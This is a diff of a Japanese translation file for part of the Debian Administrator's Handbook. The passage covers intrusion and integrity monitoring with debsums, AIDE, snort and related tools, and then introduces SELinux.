+msgstr "この本では、<xref linkend=\"advanced-administration\" xrefstyle=\"select: label quotedtitle\" /> の中で Munin を詳細にを取り上げています (<xref linkend=\"sect.munin\" />参照)。Debian は類似のツール <emphasis role=\"pkg\">cacti</emphasis> を提供しています。cacti の配備は Munin よりも少し複雑です。なぜなら cacti はもっぱら SNMP に基いているからです。ウェブインターフェイスを持つにも関わらず、設定に必要な概念を理解するには少し努力が必要です。HTML 文書 (<filename>/usr/share/doc/cacti/html/index.html</filename>) を読了していることが前提条件として求められます。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>ALTERNATIVE</emphasis> <command>mrtg</command>"
-msgstr ""
+msgstr "<emphasis>ALTERNATIVE</emphasis> <command>mrtg</command>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>mrtg</command></primary>"
-msgstr ""
+msgstr "<primary><command>mrtg</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>mrtg</command> (in the similarly-named package) is an older tool. Despite some rough edges, it can aggregate historical data and display them as graphs. It includes a number of scripts dedicated to collecting the most commonly monitored data such as processor load, network traffic, web page hits, and so on."
-msgstr ""
+msgstr "<command>mrtg</command> (同様の名前のパッケージに含まれます) は古いツールです。一部では低く評価されていますが、<command>mrtg</command> は時系列データを集計し、これをグラフとして表示することが可能です。<command>mrtg</command> は最も一般的に監視されるデータ、例えばプロセッサの負荷、ネットワークトラフィック、ウェブページのヒット、などの情報を収集する多数の専用スクリプトを備えています。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">mrtg-contrib</emphasis> and <emphasis role=\"pkg\">mrtgutils</emphasis> packages contain example scripts that can be used directly."
-msgstr ""
+msgstr "<emphasis role=\"pkg\">mrtg-contrib</emphasis> と <emphasis role=\"pkg\">mrtgutils</emphasis> パッケージには、直接使うことができるスクリプトの例が含まれます。"
 
 #. Tag: title
 #, no-c-format
 msgid "Detecting Changes"
-msgstr ""
+msgstr "変更検知"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the system is installed and configured, and barring security upgrades, there's usually no reason for most of the files and directories to evolve, data excepted. It is therefore interesting to make sure that files actually do not change: any unexpected change would therefore be worth investigating. This section presents a few tools able to monitor files and to warn the administrator when an unexpected change occurs (or simply to list such changes)."
-msgstr ""
+msgstr "システムのインストールと設定が完了したら、セキュリティアップグレードを行わない限りデータ以外のほとんどのファイルとディレクトリが変化する理由はありません。このため、ファイルが変化していないことを確認することは興味深いです。このため、ファイルに対する予想外の変化は調査に値します。この節では、ファイルに対する予想外の変化に備えて、ファイルを監視して管理者に警告する (または単純に変更をリストする) 幾つかのツールを紹介します。"
 
 #. Tag: title
 #, no-c-format
 msgid "Auditing Packages: <command>debsums</command> and its Limits"
-msgstr ""
+msgstr "パッケージの監査: <command>debsums</command> とその限界"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>debsums</command></primary>"
-msgstr ""
+msgstr "<primary><command>debsums</command></primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>GOING FURTHER</emphasis> Protecting against upstream changes"
-msgstr ""
+msgstr "<emphasis>GOING FURTHER</emphasis> 上流に対して加えられた変更から保護する"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>debsums</command> is useful in detecting changes to files coming from a Debian package, but it will be useless if the package itself is compromised, for instance if the Debian mirror is compromised. Protecting against this class of attacks involves using APT's digital signature verification system (see <xref linkend=\"sect.package-authentication\" />), and taking care to only install packages from a certified origin."
-msgstr ""
+msgstr "<command>debsums</command> は Debian パッケージの提供するファイルに対する変化を検出するのに便利ですが、例えば Debian ミラーが不正アクセスを受けた事によりパッケージ自体が不正に改竄されていた場合<command>debsums</command> は役に立ちません。この種の攻撃に対向するには、APT のデジタル署名照合システム (<xref linkend=\"sect.package-authentication\" />参照) を使い、認証された発行元からのパッケージだけをインストールするように気をつけること、が必要です。"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>debsums</command> is an interesting tool since it allows finding what installed files have been modified (potentially by an attacker), but this should be taken with a grain of salt. First, because not all Debian packages provide the fingerprints required by this program (they can be found in <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename> when they exist). <indexterm><primary>fingerprint</primary></indexterm> <indexterm><primary>control sum</primary></indexterm> <indexterm><primary>MD5</primary></indexterm> <indexterm><primary>SHA1</primary></indexterm> As a reminder: a fingerprint is a value, often a number (even though in hexadecimal notation), that contains a kind of signature for the contents of a file. This signature is calculated with an algorithm (MD5 or SHA1 being well-known examples) that more or less guarantee that even the tiniest change in the file contents implies a change in the fingerprint; this is known as the “avalanche effect”. This allows a simple numerical fingerprint to serve as a litmus test to check whether the contents of a file have been altered. These algorithms are not reversible; in other words, for most of them, knowing a fingerprint doesn't allow finding the corresponding contents. Recent mathematical advances seem to weaken the absoluteness of these principles, but their use is not called into question so far, since creating different contents yielding the same fingerprint still seems to be quite a difficult task."
-msgstr ""
+msgstr "<command>debsums</command> は興味深いツールで、(潜在的には攻撃者によって) 修正されたインストール済みファイルを見つけることが可能ですが、その結果は疑ってかかるべきです。第一に、全ての Debian パッケージが <command>debsums</command> プログラムが要求する指紋を提供しているわけではないからです (指紋が提供されているならば、指紋は <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename> に保存されています)。<indexterm><primary>fingerprint</primary></indexterm> <indexterm><primary>control sum</primary></indexterm> <indexterm><primary>MD5</primary></indexterm> <indexterm><primary>SHA1</primary></indexterm> 備忘録的になりますが: ここで指紋とは、ファイルの内容に対するある種のシグネチャを含む値、通常は数 (実際は 16 進数表記です)、です。このシグネチャはあるアルゴリズムを使って計算されます。指紋計算に使われるアルゴリズムはファイルに対して行われた小さな変化により指紋が変化することがおおよそ保証されているものです (MD5 や SHA1 がよく知られている例です); これは「アバランシェ効果」として知られています。アバランシェ効果のお陰で、簡単な数字で表される指紋がファイルの内容の変化を検出するためのリトマス試験として機能する事になります。指紋計算に使われるアルゴリズムは不可逆です; 言い換えれば、ほとんどの場合、指紋からその指紋が得られる内容を発見することは不可能であることが知られています。最近の数学的な進歩により、アルゴリズムの原理の絶対性が揺らいでいるように見えます。しかしこれはアルゴリズムを使うことに対して疑問を投げかけるものではありません。なぜなら、同じ指紋を持つ異なる内容を作成することはまだかなり難しい作業だからです。"
 
 #. Tag: para
 #, no-c-format
 msgid "In addition, the <filename>md5sums</filename> files are stored on the hard disk; a thorough attacker will therefore update these files so they contain the new control sums for the subverted files."
-msgstr ""
+msgstr "加えて、<filename>md5sums</filename> ファイルはハードディスク上に保存されます; そのため几帳面な攻撃者なら <filename>md5sums</filename> ファイルの中の指紋を改竄したファイルに対応する新しい指紋で置き換えるでしょう。"
 
 #. Tag: para
 #, no-c-format
 msgid "The first drawback can be avoided by asking <command>debsums</command> to base its checks on a <filename>.deb</filename> package instead of relying on the <filename>md5sums</filename> file. But that requires downloading the matching <filename>.deb</filename> files first:"
-msgstr ""
+msgstr "最初の欠点は <command>debsums</command> が確認を行う際に <filename>md5sums</filename> ファイルを参照するのではなく <filename>.deb</filename> パッケージを参照すれば避ける事が可能です。しかしこの場合、先に対応する <filename>.deb</filename> ファイルをダウンロードすることが必要になります:"
 
 #. Tag: screen
 #, no-c-format
@@ -872,16 +879,21 @@ msgid ""
 "# </computeroutput><userinput>debsums -p /var/cache/apt/archives -g</userinput>\n"
 "      "
 msgstr ""
+"\n"
+"<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `debsums -l`</userinput>\n"
+"<computeroutput>[ ... ]\n"
+"# </computeroutput><userinput>debsums -p /var/cache/apt/archives -g</userinput>\n"
+"      "
 
 #. Tag: para
 #, no-c-format
 msgid "It is also worth noting that, in its default configuration, <command>debsums</command> automatically generates the missing <filename>md5sums</filename> files whenever a package is installed using APT."
-msgstr ""
+msgstr "注目すべき点として、デフォルト状態の <command>debsums</command> は APT を使ってパッケージがインストールされていた場合でも存在しない <filename>md5sums</filename> ファイルを自動的に生成します。"
 
 #. Tag: para
 #, no-c-format
 msgid "The other problem can be avoided in a similar fashion: the check must simply be based on a pristine <filename>.deb</filename> file. Since this implies having all the <filename>.deb</filename> files for all the installed packages, and being sure of their integrity, the simplest way is to grab them from a Debian mirror. This operation can be slow and tedious, and should therefore not be considered a proactive technique to be used on a regular basis."
-msgstr ""
+msgstr "次の問題も同様のやり方で避ける事が可能です: この確認は本来の <filename>.deb</filename> ファイル に基づかなければいけません。この方法の前提条件は、全てのインストール済みパッケージに対する全ての <filename>.deb</filename> ファイルを取得すること、 <filename>.deb</filename> ファイルの完全性が保証されていること、です。これを満足させる最も簡単な方法は Debian ミラーから <filename>.deb</filename> ファイルを取得することです。この操作は遅くて退屈ですから、この操作を定期的かつ積極的に使うべき手法として考えるべきではありません。"
 
 #. Tag: screen
 #, no-c-format
@@ -892,281 +904,286 @@ msgid ""
 "# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput>\n"
 "      "
 msgstr ""
+"\n"
+"<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>\n"
+"<computeroutput>[ ... ]\n"
+"# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput>\n"
+"      "
 
 #. Tag: para
 #, no-c-format
 msgid "Note that this example uses the <command>grep-status</command> command from the <emphasis role=\"pkg\">dctrl-tools</emphasis> package, which is not installed by default."
-msgstr ""
+msgstr "この例の中で、デフォルトではインストールされない <emphasis role=\"pkg\">dctrl-tools</emphasis> パッケージに含まれる <command>grep-status</command> コマンドが使われている点に注意してください。"
 
 #. Tag: title
 #, no-c-format
 msgid "Monitoring Files: AIDE"
-msgstr ""
+msgstr "ファイル監視: AIDE"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis role=\"pkg\">aide</emphasis> (Debian package)</primary>"
-msgstr ""
+msgstr "<primary><emphasis role=\"pkg\">aide</emphasis> (Debian パッケージ)</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The AIDE tool (<emphasis>Advanced Intrusion Detection Environment</emphasis>) allows checking file integrity, and detecting any change against a previously recorded image of the valid system. This image is stored as a database (<filename>/var/lib/aide/aide.db</filename>) containing the relevant information on all files of the system (fingerprints, permissions, timestamps and so on). This database is first initialized with <command>aideinit</command>; it is then used daily (by the <filename>/etc/cron.daily/aide</filename> script) to check that nothing relevant changed. When changes are detected, AIDE records them in log files (<filename>/var/log/aide/*.log</filename>) and sends its findings to the administrator by email."
-msgstr ""
+msgstr "AIDE ツール (<emphasis>Advanced Intrusion Detection Environment</emphasis>) を使うことで、ファイルの完全性を確認したり、前回保存された正当なシステムのイメージに対する変更を検知したり、することが可能です。このイメージはデータベース (<filename>/var/lib/aide/aide.db</filename>) に保存され、システムの全てのファイルに対して関連する情報(指紋、パーミッション、タイムスタンプなど) を保存しています。このデータベースは最初に <command>aideinit</command> を使って初期化されます; そして毎日、関係のある情報が何も変更されていないことを確認するために、(<filename>/etc/cron.daily/aide</filename> スクリプトから) 使われます。変更が検知されたら、AIDE はこれをログファイル (<filename>/var/log/aide/*.log</filename>)  に記録し、見つかった内容を管理者にメールで送信します。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>IN PRACTICE</emphasis> Protecting the database"
-msgstr ""
+msgstr "<emphasis>IN PRACTICE</emphasis> データベースの保護"
 
 #. Tag: para
 #, no-c-format
 msgid "Since AIDE uses a local database to compare the states of the files, the validity of its results is directly linked to the validity of the database. If an attacker gets root permissions on a compromised system, they will be able to replace the database and cover their tracks. A possible workaround would be to store the reference data on read-only storage media."
-msgstr ""
+msgstr "AIDS はファイルの状態を比較するためにローカルデータベースを使います。結果の信頼性は直接的にデータベースの信頼性と結びついています。攻撃者が不正アクセスされたシステムの root パーミッションを取得した場合、攻撃者はデータベースを置き換えて自分の行動の形跡を隠すことが可能です。可能な次善策は参照データを読み込み専用のストレージメディアに保存することです。"
 
 #. Tag: para
 #, no-c-format
 msgid "Many options in <filename>/etc/default/aide</filename> can be used to tweak the behavior of the <emphasis role=\"pkg\">aide</emphasis> package. The AIDE configuration proper is stored in <filename>/etc/aide/aide.conf</filename> and <filename>/etc/aide/aide.conf.d/</filename> (actually, these files are only used by <command>update-aide.conf</command> to generate <filename>/var/lib/aide/aide.conf.autogenerated</filename>). Configuration indicates which properties of which files need to be checked. For instance, the contents of log files changes routinely, and such changes can be ignored as long as the permissions of these files stay the same, but both contents and permissions of executable programs must be constant. Although not very complex, the configuration syntax is not fully intuitive, and reading the <citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry> manual page is therefore recommended."
-msgstr ""
+msgstr "<filename>/etc/default/aide</filename> に含まれる多くのオプションを使って <emphasis role=\"pkg\">aide</emphasis> パッケージの挙動を微調整します。AIDE 設定は <filename>/etc/aide/aide.conf</filename> と <filename>/etc/aide/aide.conf.d/</filename> に保存されています (実質的に言えば、これらのファイルは <command>update-aide.conf</command> が <filename>/var/lib/aide/aide.conf.autogenerated</filename> を生成するためだけに使われます)。設定は確認する必要のあるファイルの属性の種類を指定します。例えば、ログファアイルの内容は定期的に変わりますが、この種の変更はファイルのパーミッションが同じなら無視することが可能です。しかし、実行可能プログラムの内容とパーミッションの両方は必ず同じでなければいけません。設定の構文は、とても複雑というわけではありませんが、完全に直感的ではありません。<citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry> マニュアルページを読むことを推奨します。"
 
 #. Tag: para
 #, no-c-format
 msgid "A new version of the database is generated daily in <filename>/var/lib/aide/aide.db.new</filename>; if all recorded changes were legitimate, it can be used to replace the reference database."
-msgstr ""
+msgstr "データベースの新しいバージョンは毎日生成され、<filename>/var/lib/aide/aide.db.new</filename> に保存されます; 全ての記録された変更が正当ならば、参照データベースを新しいデータベースに置き換えることが可能です。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>ALTERNATIVE</emphasis> Tripwire and Samhain"
-msgstr ""
+msgstr "<emphasis>ALTERNATIVE</emphasis> Tripwire と Samhain"
 
 #. Tag: para
 #, no-c-format
 msgid "Tripwire is very similar to AIDE; even the configuration file syntax is almost the same. The main addition provided by <emphasis role=\"pkg\">tripwire</emphasis> is a mechanism to sign the configuration file, so that an attacker cannot make it point at a different version of the reference database."
-msgstr ""
+msgstr "Tripwire は AIDE とよく似ています; 設定ファイルの構文もほとんど同じです。AIDE と <emphasis role=\"pkg\">tripwire</emphasis> の主な違いは <emphasis role=\"pkg\">tripwire</emphasis> には設定ファイルを署名するメカニズムが備わっている点です。設定ファイルを署名することで、参照データベースの示す先を異なるバージョンに差し替えることが不可能になります。"
 
 #. Tag: para
 #, no-c-format
 msgid "Samhain also offers similar features, as well as some functions to help detecting rootkits (see the QUICK LOOK sidebar). It can also be deployed globally on a network, and record its traces on a central server (with a signature)."
-msgstr ""
+msgstr "Samhain も類似の機能を提供しますが、rootkit の検知に役立つ幾つかの機能を備えています (傍注 QUICK LOOK を参照)。Samhain はネットワークを使って広範囲に配備され、中央サーバ上に履歴を (署名と一緒に) 記録することが可能です。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>QUICK LOOK</emphasis> The <emphasis role=\"pkg\">checksecurity</emphasis> and <emphasis role=\"pkg\">chkrootkit</emphasis>/<emphasis role=\"pkg\">rkhunter</emphasis> packages"
-msgstr ""
+msgstr "<emphasis>QUICK LOOK</emphasis> <emphasis role=\"pkg\">checksecurity</emphasis> と <emphasis role=\"pkg\">chkrootkit</emphasis>/<emphasis role=\"pkg\">rkhunter</emphasis> パッケージ"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis role=\"pkg\">checksecurity</emphasis></primary>"
-msgstr ""
+msgstr "<primary><emphasis role=\"pkg\">checksecurity</emphasis></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The first of these packages contains several small scripts performing basic checks on the system (empty passwords, new setuid files, and so on) and warning the administrator if required. Despite its explicit name, an administrator should not rely solely on it to make sure a Linux system is secure."
-msgstr ""
+msgstr "<emphasis role=\"pkg\">checksecurity</emphasis> パッケージには、システムの基本的な確認 (空のパスワード、新しい setuid ファイル、など) を行い、必要ならば管理者に警告するための、復数の小さなスクリプトが含まれます。checksecurity という明快な名前にも関わらず、管理者はこれ 1 つだけに頼って、Linux システムが安全であることを保証するべきではありません。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">chkrootkit</emphasis> and <emphasis role=\"pkg\">rkhunter</emphasis> packages allow looking for <emphasis>rootkits</emphasis> potentially installed on the system. As a reminder, these are pieces of software designed to hide the compromise of a system while discreetly keeping control of the machine. The tests are not 100% reliable, but they can usually draw the administrator's attention to potential problems."
-msgstr ""
+msgstr "<emphasis role=\"pkg\">chkrootkit</emphasis> と <emphasis role=\"pkg\">rkhunter</emphasis> パッケージを使うことで、システムに潜在的にインストールされた <emphasis>rootkit</emphasis> を探し出すことが可能です。備忘録的になりますが、<emphasis>rootkit</emphasis> はシステムの不正侵入を隠すために設計されたソフトウェアで、察知されること無くマシンを制御可能な状態にし続けます。このテストは 100% 信頼できるものではありませんが、管理者はテストにより潜在的な問題に対して注意を払うようになります。"
 
 #. Tag: title
 #, no-c-format
 msgid "Detecting Intrusion (IDS/NIDS)"
-msgstr ""
+msgstr "侵入検知 (IDS/NIDS)"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>detection, intrusion</primary>"
-msgstr ""
+msgstr "<primary>検知、侵入</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>intrusion detection</primary>"
-msgstr ""
+msgstr "<primary>侵入検知</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>IDS</primary>"
-msgstr ""
+msgstr "<primary>IDS</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>intrusion detection system</primary>"
-msgstr ""
+msgstr "<primary>侵入検知システム</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>NIDS</primary>"
-msgstr ""
+msgstr "<primary>NIDS</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>Network</primary><secondary>IDS</secondary>"
-msgstr ""
+msgstr "<primary>ネットワーク</primary><secondary>IDS</secondary>"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>BACK TO BASICS</emphasis> Denial of service"
-msgstr ""
+msgstr "<emphasis>BACK TO BASICS</emphasis> サービス妨害"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>denial of service</primary>"
-msgstr ""
+msgstr "<primary>サービスの妨害</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "A “denial of service” attack has only one goal: to make a service unavailable. Whether such an attack involves overloading the server with queries or exploiting a bug, the end result is the same: the service is no longer operational. Regular users are unhappy, and the entity hosting the targeted network service suffers a loss in reputation (and possibly in revenue, for instance if the service was an e-commerce site)."
-msgstr ""
+msgstr "「サービス妨害」攻撃の目的は 1 つしかありません: サービスを使用不能にすることです。そのような攻撃は、問い合わせを使ってサーバに大きな負荷を加えたり、バグを不正に活用したりすることで、実行されます。最終結果はどれも同じです: サービスはもはや使用できません。正規のユーザは迷惑しますし、標的にされたネットワークサービスをホストしている全体の評価が落ちます (例えばサービスが電子商取引サイトの場合、さらに収入が落ちます)。"
 
 #. Tag: para
 #, no-c-format
 msgid "Such an attack is sometimes “distributed”; this usually involves overloading the server with large numbers of queries coming from many different sources so that the server becomes unable to answer the legitimate queries. These types of attacks have gained well-known acronyms: <acronym>DoS</acronym> and <acronym>DDoS</acronym> (depending on whether the denial of service attack is distributed or not)."
-msgstr ""
+msgstr "「サービス妨害」攻撃はしばしば「分散」されることがあります; これは通常、数多くの異なる送信元から数多くの問い合わせを送信する事により、サーバに負荷を加えます。こうすることで、サーバは正規の問い合わせに応答できなくなります。この種の攻撃には、よく知られている頭字語が与えられています: <acronym>DoS</acronym> と <acronym>DDoS</acronym> です (サービス妨害攻撃が分散型か否かに基づきます)。"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>snort</command> (in the Debian package of the same name) is a NIDS — a <emphasis>Network Intrusion Detection System</emphasis>. Its function is to listen to the network and try to detect infiltration attempts and/or hostile acts (including denial of service attacks). All these events are logged, and a daily email is sent to the administrator with a summary of the past 24 hours."
-msgstr ""
+msgstr "<command>snort</command> (同名の Debian パッケージに含まれます) は NIDS <emphasis>ネットワーク型侵入検知システム</emphasis> です。NIDS の機能はネットワークをリッスンして侵入試行および敵対行為 (サービス妨害攻撃も含めて) を検知しようとします。全てのイベントは記録され、過去 24 時間のイベントをまとめた電子メールが管理者宛に毎日送信されます。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>snort</command></primary>"
-msgstr ""
+msgstr "<primary><command>snort</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Its configuration requires describing the range of addresses that the local network covers. In practice, this means the set of all potential attack targets. Other important parameters can be configured with <command>dpkg-reconfigure snort</command>, including the network interface to monitor. This will often be <literal>eth0</literal> for an Ethernet connection, but other possibilities exist such as <literal>ppp0</literal> for an ADSL or PSTN (<emphasis>Public Switched Telephone Network</emphasis>, or good old dialup modem), or even <literal>wlan0</literal> for some wireless network cards."
-msgstr ""
+msgstr "snort の設定にローカルネットワークをカバーするアドレス範囲を追加します。具体的に言えば、アドレス範囲とは潜在的に攻撃対象となりうる全てのアドレス意味します。他の重要なパラメータは <command>dpkg-reconfigure snort</command> を使って設定します。これには監視するネットワークインターフェイスが含まれます。監視対象のネットワークインターフェイスは通常イーサネット接続用の <literal>eth0</literal> ですが、他の可能性も存在します。例えば ADSL や PSTN (<emphasis>Public Switched Telephone Network</emphasis>、かなり古いダイヤルアップモデム) 用の <literal>ppp0</literal>、無線ネットワークカード用の <literal>wlan0</literal> などです。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>GOING FURTHER</emphasis> Integration with <command>prelude</command>"
-msgstr ""
+msgstr "<emphasis>GOING FURTHER</emphasis> <command>prelude</command> との統合"
 
 #. Tag: para
 #, no-c-format
 msgid "Prelude brings centralized monitoring of security information. Its modular architecture includes a server (the <emphasis>manager</emphasis> in <emphasis role=\"pkg\">prelude-manager</emphasis>) which gathers alerts generated by <emphasis>sensors</emphasis> of various types."
-msgstr ""
+msgstr "prelude を使うことでセキュリティ情報の中央集中型監視が可能になります。prelude のモジュール式設計には、サーバ (<emphasis role=\"pkg\">prelude-manager</emphasis> に含まれる<emphasis>マネージャ</emphasis>) が含まれ、サーバは様々な種類の<emphasis>センサー</emphasis>によって生成された警告を収集します。"
 
 #. Tag: para
 #, no-c-format
 msgid "Snort can be configured as such a sensor. Other possibilities include <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) which monitors log files (in a manner similar to <command>logcheck</command>, described in <xref linkend=\"sect.logcheck\" />)."
-msgstr ""
+msgstr "Snort を prelude のセンサーとして設定することが可能です。他の可能性には <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) があります。これは (<xref linkend=\"sect.logcheck\" /> で説明されている <command>logcheck</command> と同様のやり方で) ログファイルを監視します。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>prelude</command></primary>"
-msgstr ""
+msgstr "<primary><command>prelude</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <command>snort</command> configuration file (<filename>/etc/snort/snort.conf</filename>) is very long, and the abundant comments describe each directive with much detail. Getting the most out of it requires reading it in full and adapting it to the local situation. For instance, indicating which machine hosts which service can limit the number of incidents <command>snort</command> will report, since a denial of service attack on a desktop machine is far from being as critical as one on a DNS server. Another interesting directive allows storing the mappings between IP addresses and MAC addresses (these uniquely identify a network card), so as to allow detecting <emphasis>ARP spoofing</emphasis> attacks by which a compromised machine attempts to masquerade as another such as a sensitive server."
-msgstr ""
+msgstr "<command>snort</command> 設定ファイル (<filename>/etc/snort/snort.conf</filename>) はとても長く、コメントを使ってそれぞれの指示文がとても詳しく説明されています。設定項目を最大限に活用するには、コメントを全部読んで、現場の状態に適用する必要があります。例えば、マシンとそのマシンがホストするサービスの対応関係を表しておく事により、<command>snort</command> が報告する事故の数を制限することが可能です。なぜなら、デスクトップマシンへのサービス妨害攻撃は DNS サーバへのサービス妨害攻撃に比べて致命的な問題ではないからです。さらに別の興味深い指示文を使えば、IP アドレスと MAC アドレス (一意的にネットワークカードを識別するもの) 間の対応付けを保存することが可能です。こうすることで、不正侵入されたマシンが他の慎重に扱うべきサーバのような他のマシンになりすますという、<emphasis>ARP spoofing</emphasis> 攻撃を検知することが可能になります。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>CAUTION</emphasis> Range of action"
-msgstr ""
+msgstr "<emphasis>CAUTION</emphasis> 動作範囲"
 
 #. Tag: para
 #, no-c-format
 msgid "The effectiveness of <command>snort</command> is limited by the traffic seen on the monitored network interface. It will obviously not be able to detect anything if it cannot observe the real traffic. When plugged into a network switch, it will therefore only monitor attacks targeting the machine it runs on, which is probably not the intention. The machine hosting <command>snort</command> should therefore be plugged into the “mirror” port of the switch, which is usually dedicated to chaining switches and therefore gets all the traffic."
-msgstr ""
+msgstr "<command>snort</command> の有効性は監視対象のネットワークインターフェイス上を流れるトラフィックによって制限されます。<command>snort</command> が真のトラフィックを観察することができない場合、当然ながら何も検知されません。<command>snort</command> が実行されているマシンをネットワークスイッチに接続した場合、<command>snort</command> が実行されているマシンを対象にした攻撃だけを検知することが可能です。この挙動は意図するものではないかもしれません。このため <command>snort</command> が実行されているマシンはネットワークスイッチの「ミラー」ポートに接続されるべきです。通常「ミラー」ポートはスイッチをカスケード接続するために使われるため、全てのトラフィックを取得する事が可能です。"
 
 #. Tag: para
 #, no-c-format
 msgid "On a small network based around a network hub, there is no such problem, since all machines get all the traffic."
-msgstr ""
+msgstr "ネットワークが 1 台のネットワークハブ近傍に制限されている場合、そのような問題はありません。なぜなら、全てのマシンは全てのトラフィックを受け取るからです。"
 
 #. Tag: title
 #, no-c-format
 msgid "Introduction to SELinux"
-msgstr ""
+msgstr "SELinux の紹介"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>SELinux</primary>"
-msgstr ""
+msgstr "<primary>SELinux</primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "Principles"
-msgstr ""
+msgstr "原理"
 
 #. Tag: para
 #, no-c-format
 msgid "SELinux (<emphasis>Security Enhanced Linux</emphasis>) is a <emphasis>Mandatory Access Control</emphasis> system built on Linux's LSM (<emphasis>Linux Security Modules</emphasis>) interface. In practice, the kernel queries SELinux before each system call to know whether the process is authorized to do the given operation."
-msgstr ""
+msgstr "SELinux (<emphasis>Security Enhanced Linux</emphasis>) は Linux の LSM (<emphasis>Linux Security Modules</emphasis>) インターフェイス上に設けられた<emphasis>強制アクセス制御</emphasis> システムです。具体的に言えば、カーネルはそれぞれのシステムコールの前にシステムコールを発行したプロセスが指定された操作に対する権限を与えられているか SELinux に問い合わせます。"
 
 #. Tag: para
 #, no-c-format
 msgid "SELinux uses a set of rules — collectively known as a <emphasis>policy</emphasis> — to authorize or forbid operations. Those rules are difficult to create. Fortunately, two standard policies (<emphasis>targeted</emphasis> and <emphasis>strict</emphasis>) are provided to avoid the bulk of the configuration work."
-msgstr ""
+msgstr "SELinux はまとめて<emphasis>ポリシー</emphasis>として知られているルール群を使い、操作の認可と禁止を行います。これらのルールの作成は難しいです。幸いなことに、設定作業の大部分を避けるために 2 種類の標準的なポリシー (<emphasis>targeted</emphasis> と <emphasis>strict</emphasis>) が提供されています。"
 
 #. Tag: para
 #, no-c-format
 msgid "With SELinux, the management of rights is completely different from traditional Unix systems. The rights of a process depend on its <emphasis>security context</emphasis>. The context is defined by the <emphasis>identity</emphasis> of the user who started the process, the <emphasis>role</emphasis> and the <emphasis>domain</emphasis> that the user carried at that time. The rights really depend on the domain, but the transitions between domains are controlled by the roles. Finally, the possible transitions between roles depend on the identity."
-msgstr ""
+msgstr "SELinux を使うと、管理権限が伝統的な Unix システムとは全く違ったものになります。プロセスの権限は SELinux の<emphasis>セキュリティコンテキスト</emphasis>に依存します。SELinux の<emphasis>セキュリティコンテキスト</emphasis>は、プロセスを開始したユーザの<emphasis>識別情報</emphasis>、<emphasis>ロール</emphasis>、ユーザがプロセス開始時点で持っていた<emphasis>ドメイン</emphasis>、によって定義されます。権限は間違いなくドメインに依存しますが、ドメイン間の遷移はそのロールによって制御されます。最後にロール間の遷移の可否は識別情報に依存します。"
 
 #. Tag: title
 #, no-c-format
 msgid "Security contexts and Unix users"
-msgstr ""
+msgstr "セキュリティコンテキストと Unix ユーザ"
 
 #. Tag: para
 #, no-c-format
 msgid "In practice, during login, the user gets assigned a default security context (depending on the roles that they should be able to endorse). This defines the current domain, and thus the domain that all new child processes will carry. If you want to change the current role and its associated domain, you must call <command>newrole -r <replaceable>role_r</replaceable> -t <replaceable>domain_t</replaceable></command> (there's usually only a single domain allowed for a given role, the <literal>-t</literal> parameter can thus often be left out). This command authenticates you by asking you to type your password. This feature forbids programs to automatically switch roles. Such changes can only happen if they are explicitly allowed in the SELinux policy."
-msgstr ""
